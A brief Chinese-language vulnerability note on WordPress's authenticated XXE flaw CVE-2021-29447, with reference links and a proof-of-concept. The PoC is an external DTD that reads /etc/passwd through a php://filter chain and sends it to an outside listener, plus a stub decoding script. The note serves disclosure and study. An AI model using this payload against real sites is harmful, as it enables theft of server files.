# WordPress 5.6-5.7-经过身份验证的XXE（CVE-2021-29447）

能够上传文件的用户（例如Author）可以利用媒体库中的XML解析问题来导致XXE攻击。WordPress使用了一个名为ID3的MP3解析库，该库受到XML外部实体（XXE）漏洞的影响，该漏洞会影响PHP 8及更高版本。

PoC：


```xml
<!ENTITY % file SYSTEM "php://filter/zlib.deflate/read=convert.base64-encode/resource=/etc/passwd">
<!ENTITY % init "<!ENTITY &#37; trick SYSTEM 'http://host.docker.internal:8001/?p=%file;'>" >
```

decryption.php：


```php
<?php

echo zlib_decode(base64_decode(''));

```

参考：https://github.com/motikan2010/CVE-2021-29447

ref：

* https://wpscan.com/vulnerability/cbbe6c17-b24e-4be4-8937-c78472a138b5
* https://core.trac.wordpress.org/changeset/29378
